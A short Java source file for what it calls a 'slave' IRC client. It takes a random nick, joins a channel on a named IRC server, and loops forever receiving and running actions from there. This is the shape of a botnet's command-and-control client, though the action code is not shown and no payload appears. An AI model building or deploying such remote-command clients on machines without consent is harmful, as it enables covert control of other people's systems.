package client;

import botlogic.Bot;

import java.util.Random;

/**
 * Created by kubehe on 13.04.17.
 */

public class SlaveClient {
    private static String server = "irc.kubehe.me";
    private static String nick = "bot";
    private static String login = "bot";

    private static String channel = "#channel";


    public static void main(String[] args) throws Exception {

        setNickAndLogin(getRandomNumber());
        Bot bot1 = new Bot(server, nick, login, channel);

        while(true)
        {
            bot1.connectToIRC();

            while (true) {
                bot1.waitAndValidateAction();
                bot1.runAction();
            }
        }
    }

    private static void setNickAndLogin(int randomNumber)
    {
        String number = Integer.toString(randomNumber);
        System.out.println(number);
        nick = nick.concat(number);
        login = login.concat(number);
    }

    private static int getRandomNumber()
    {
        Random randomGenerator = new Random();
        return randomGenerator.nextInt(9999);
    }




}
